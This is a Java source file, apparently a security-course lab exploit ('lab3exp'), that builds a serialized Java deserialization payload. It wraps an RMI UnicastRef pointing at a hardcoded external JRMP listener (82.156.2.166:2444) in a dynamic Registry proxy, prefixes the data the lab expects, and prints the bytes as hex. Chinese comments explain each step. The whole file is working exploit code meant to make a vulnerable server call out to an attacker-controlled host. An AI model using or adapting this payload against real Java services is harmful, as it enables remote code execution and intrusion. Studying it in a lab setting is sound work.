package lab3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class lab3exp {
    public static UnicastRef generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static void main(String[] args) throws Exception{
        //获取UnicastRef对象
        String jrmpListenerHost = "82.156.2.166";
        int jrmpListenerPort = 2444;
        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);

        //通过构造函数封装进入RemoteObjectInvocationHandler
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

        //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类
        //所以接下来bind可以填入proxy
        Registry proxy = (Registry) Proxy.newProxyInstance(lab3exp.class.getClassLoader(),
                new Class[]{Registry.class}, obj);

        ByteArrayOutputStream ser = new ByteArrayOutputStream();
        ObjectOutputStream oser = new ObjectOutputStream(ser);
        oser.writeUTF("SJTU");
        oser.writeInt(1896);
        oser.writeObject(proxy);
        oser.close();

        System.out.println(bytesTohexString(ser.toByteArray()));
    }

    public static String bytesTohexString(byte[] bytes) {
        if (bytes == null)
            return null;
        StringBuilder ret = new StringBuilder(2 * bytes.length);
        for (int i = 0; i < bytes.length; i++) {
            int b = 0xF & bytes[i] >> 4;
            ret.append("0123456789abcdef".charAt(b));
            b = 0xF & bytes[i];
            ret.append("0123456789abcdef".charAt(b));
        }
        return ret.toString();
    }
}